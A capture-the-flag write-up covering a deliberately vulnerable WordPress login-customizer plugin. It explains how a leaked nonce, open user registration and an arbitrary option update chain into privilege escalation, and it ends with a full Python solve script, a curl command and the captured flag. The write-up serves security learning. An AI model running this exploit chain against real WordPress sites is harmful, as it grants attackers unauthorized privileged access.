# Sup3rcustomiz3r

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 11 solves / 775 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

My friend is developing a cool plugin to help me customize my Login page, isn't that nice? So many stuff and options, I'm sure it's 100% safe to use...

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224215055.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Sup3rcustomiz3r/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sup3rcustomiz3r)-[2025.02.24|21:51:38(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sup3rcustomiz3r)-[2025.02.24|21:51:39(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
   creating: server-given/challenge-custom/
  [...]
    inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the other challenges, we should first take a look at the `docker/wordpress/toolbox/Makefile` file:

```bash
[...]
$(WP_CLI) plugin activate login-customizer
```

In here, the WordPress site only installed plugin `login-customizer`.

Let's read this plugin's source code!

First off, what's our objective in this challenge? Where's the flag?

After a quick look into the plugin source code, we can see that there's an unauthenticated AJAX action, `patchstack_get_the_flag`. This AJAX action has a callback function named `get_the_flag`:

```php
add_action("wp_ajax_nopriv_patchstack_get_the_flag", "get_the_flag");
add_action("wp_ajax_patchstack_get_the_flag", "get_the_flag");

function get_the_flag()
{
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "author", "contributor"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Unauthorized");
    }
}
```

In this callback function, if the current user's role is either `administrator`, `author`, or `contributor`, it'll send a JSON object with the flag value in the `value` attribute. Which means we need to be **authenticated with one of those roles** in order to get the flag.

With that said, we need to somehow **escalate our privilege**. To do so, we can search for common privilege escalation sinks, such as `add_user_meta`, `update_user_meta`, `wp_insert_user`, and many more. Eventually, we'll find that this plugin allows us to control WordPress function **[`update_option`](https://developer.wordpress.org/reference/functions/update_option/)**'s parameter `$option` and `$value` in **class `Login_Customizer_Features` method `set_option`**, which is a callback method called by authenticated AJAX action **`login_customizer_set_option`**:

```php
class Login_Customizer_Features {
    [...]
    public function __construct() {
        [...]
        $this->adding_google_recaptcha_functionality();
    }
    protected function adding_google_recaptcha_functionality() {
        [...]
        add_action( 'wp_ajax_login_customizer_set_option', array( $this, 'set_option' ) );
        [...]
    }
    [...]
    function set_option() {
        if ( isset( $_POST['_wpnonce'] ) && wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['_wpnonce'] ) ), 'login-customizer-admin' ) ) {
            $op = sanitize_text_field($_POST['option']);
            $val = sanitize_text_field($_POST['value']);
            update_option($op, $val);
            wp_send_json_success( 'Option has been saved', 201 );
        }
    }
}
```

As you can see, we can update any options via POST parameter `option` for the option name and parameter `value` for the option's value. Therefore, this `set_option` method is vulnerable to **arbitrary option update**, which allows us to escalate our privilege to any role.

With an arbitrary option update vulnerability, we can update the site option to **allow user registration** (Option name `users_can_register`) to be enabled (Value integer `1`) and **update the default role** (`default_role`) to `administrator`. So, when we register a new account, the account's role will be the value of option `default_role`.

But before we can update any options, it has this nonce check:

```php
class Login_Customizer_Features {
    [...]
    function set_option() {
        if ( isset( $_POST['_wpnonce'] ) && wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['_wpnonce'] ) ), 'login-customizer-admin' ) ) {
            [...]
        }
    }
}
```

In here, the nonce is binded to action `login-customizer-admin`. If we search for this action, we can see that this action's nonce is generated via method `preview_data` in class `Login_Customizer_Customizer_Scripts`, which is a callback method from hook **[`wp_footer`](https://developer.wordpress.org/reference/hooks/wp_footer/)**:

```php
class Login_Customizer_Customizer_Scripts {
    [...]
    public function __construct() {
        [...]
        add_action( 'wp_footer', array( $this, 'preview_data' ), 1000 );
        [...]
    }
    [...]
    public function preview_data() {
        if ( ! $this->is_preview_mode() ) {
            return;
        }
        echo '<script>var _customizePartialRefreshExports = "";var _ldAdminNounce = '.wp_create_nonce( 'login-customizer-admin').'"</script>';
    }
}
```

According to [WordPress documentation about this `wp_footer` hook](https://developer.wordpress.org/reference/hooks/wp_footer/#more-information), the callback method `preview_data` will be triggered by WordPress function [`wp_footer()`](https://developer.wordpress.org/reference/functions/wp_footer/) and the result is in the `<footer>` HTML element. This function will basically be called in many different themes, including the default theme.

But again, before callback method `preview_data` generates a nonce for action `login-customizer-admin`, it'll call method `is_preview_mode`, which just checks if we provided GET parameter `preview` or not:

```php
class Login_Customizer_Customizer_Scripts {
    [...]
    public function is_preview_mode() {
        // Check if preview page is the current page.
        if ( isset( $_GET['preview'] ) ) {
            return true;
        }
        else {
            return false;
        }
    }
}
```

Therefore, we can easily generate a nonce for action `login-customizer-admin` if we just provide GET parameter `preview` in basically any pages that will call WordPress function `wp_footer()`:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sup3rcustomiz3r)-[2025.02.26|13:55:53(HKT)]
└> curl -s --get http://52.77.81.199:9193/ --data 'preview=anything' | grep '_ldAdminNounce = '
<script>var _customizePartialRefreshExports = "";var _ldAdminNounce = c0c063cb50"</script></body>
```

So... We can now update arbitrary options given that we can generate a valid nonce for that action?

Well, not yet. Remember, the arbitrary options update's AJAX action **requires authentication**:

```php
class Login_Customizer_Features {
    [...]
    protected function adding_google_recaptcha_functionality() {
        [...]
        add_action( 'wp_ajax_login_customizer_set_option', array( $this, 'set_option' ) );
        [...]
    }
}
```

Hmm... Maybe this plugin allows us to register a new account? If we search for WordPress function [`wp_create_user`](https://developer.wordpress.org/reference/functions/wp_create_user/) or just a few lines below that AJAX action registration, an unauthenticated AJAX action `login_register_user` allows us to do that: 

```php
class Login_Customizer_Features {
    [...]
    protected function adding_google_recaptcha_functionality() {
        [...]
        add_action( 'wp_ajax_nopriv_login_register_user', array( $this, 'login_register_user' ) );
        [...]
    }
    [...]
    function login_register_user() {
        $username = sanitize_user($_POST['username']);
        $email = sanitize_email($_POST['email']);
        $password = $_POST['password'];
        [...]
        $user_id = wp_create_user($username, $password, $email);
        update_option("default_role", "subscriber");
        [...]
    }
}
```

In this callback method `login_register_user`, it'll create a new user based on the provided POST parameter `username`, `email`, and `password`. Then, update option `default_role` to `subscriber`.

Ah ha! Since the option update happens **BEFORE** `wp_create_user` function call, if we update option `default_role` to `administrator`, it'll create a new user with the role in the value of option `default_role`!

If `update_option` function call is one line above the `wp_create_user` function call like the following, this privilege escalation vulnerability could have been prevented!

```php
class Login_Customizer_Features {
    [...]
    function login_register_user() {
        [...]
        update_option("default_role", "subscriber");
        $user_id = wp_create_user($username, $password, $email);
        [...]
    }
}
```

## Exploitation

Armed with above information, we can get the flag via the following steps:
1. Register a new user via unauthenticated AJAX action `login_register_user` (Role `subscriber`)
2. Login to that new user and get a valid nonce that binds to action `login-customizer-admin` via sending a GET request to `/` with parameter `preview`
3. Using the valid nonce, update `default_role` option's value to any mid-level or above privilege role, such as `administrator`, via authenticated AJAX action `login_customizer_set_option`
4. Register a new user again, but this time the default role will be the value of our updated option `default_role`
5. Get the flag via AJAX action `patchstack_get_the_flag`

To automate the above steps, I've written the following Pythons solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import re._compiler
import requests
import random
import string
import re
from bs4 import BeautifulSoup

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.LOGIN_ENDPOINT = '/wp-login.php'
        self.NONCE_REGEX_PATTERN = re.compile(r'var\s_ldAdminNounce\s=\s([0-9a-f]+)')
        self.AJAX_ENDPOINT = '/wp-admin/admin-ajax.php'
        self.UPDATE_OPTION_NAME = 'default_role'
        self.UPDATE_OPTION_VALUE = 'author'
        self.REGISTER_AJAX_ACTION = 'login_register_user'
        self.UPDATE_OPTION_AJAX_ACTION = 'login_customizer_set_option'
        self.GET_FLAG_AJAX_ACTION = 'patchstack_get_the_flag'
        self.newSession()

    @staticmethod
    def generateRandomString(length, isUsingSpecialCharacters=False):
        if isUsingSpecialCharacters:
            return ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(length))
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def newSession(self):
        self.session = requests.Session()
        self.randomUsername = Solver.generateRandomString(32)
        self.randomEmail = Solver.generateRandomString(10) + '@' + Solver.generateRandomString(10) + '.' + Solver.generateRandomString(10)
        self.randomPassword = Solver.generateRandomString(32, isUsingSpecialCharacters=True)

    def register(self):
        data = {
            'action': self.REGISTER_AJAX_ACTION,
            'username': self.randomUsername,
            'email': self.randomEmail,
            'password': self.randomPassword
        }
        jsonResponse = self.session.post(f'{self.baseUrl}{self.AJAX_ENDPOINT}', data=data).json()
        if jsonResponse == 0:
            print(f'[-] Unable to register a new account')
            exit(0)

    def login(self):
        data = {
            'log': self.randomUsername,
            'pwd': self.randomPassword
        }
        responseText = self.session.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', data=data).text
        if 'Error:' in responseText:
            print('[-] Unable to login')
            exit(0)

    def getAjaxNonce(self):
        parameter = { 'preview': 'anything' }
        soup = BeautifulSoup(self.session.get(self.baseUrl, params=parameter).text, 'html.parser')
        nonceScriptElementText = soup.findAll('script')[-1].text

        match = self.NONCE_REGEX_PATTERN.search(nonceScriptElementText)
        if match is None:
            print('[-] Unable to get the AJAX nonce')
            exit(0)

        nonce = match.group(1)
        print(f'[+] AJAX nonce: {nonce}')
        return nonce
    
    def updateDefaultRoleOption(self, nonce):
        data = {
            'action': self.UPDATE_OPTION_AJAX_ACTION,
            '_wpnonce': nonce,
            'option': self.UPDATE_OPTION_NAME,
            'value': self.UPDATE_OPTION_VALUE
        }
        responseJson = self.session.post(f'{self.baseUrl}{self.AJAX_ENDPOINT}', data=data).json()
        if responseJson == 0:
            print(f'[-] Unable to update option `{self.UPDATE_OPTION_NAME}`')
            exit(0)

    def getFlag(self):
        parameter = { 'action': self.GET_FLAG_AJAX_ACTION }
        jsonResponse = self.session.get(f'{self.baseUrl}{self.AJAX_ENDPOINT}', params=parameter).json()
        if jsonResponse['data'] == 'Unauthorized':
            print('[-] Our role is not at least mid-level privilege')
            exit(0)

        flag = jsonResponse['data']['value']
        print(f'[+] Flag: {flag}')

    def solve(self):
        self.register()
        self.login()

        nonce = self.getAjaxNonce()
        self.updateDefaultRoleOption(nonce)

        self.newSession()
        self.register()
        self.login()
        self.getFlag()

if __name__ == '__main__':
    baseUrl = 'http://52.77.81.199:9193'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sup3rcustomiz3r)-[2025.02.26|14:45:48(HKT)]
└> python3 solve.py
[+] AJAX nonce: 88c41977a5
[+] Flag: CTF{TUNING_NOT_FOR_THE_WIN_0z933}
```

- **Flag: `CTF{TUNING_NOT_FOR_THE_WIN_0z933}`**

## Conclusion

What we've learned:

1. Privilege escalation via arbitrary option update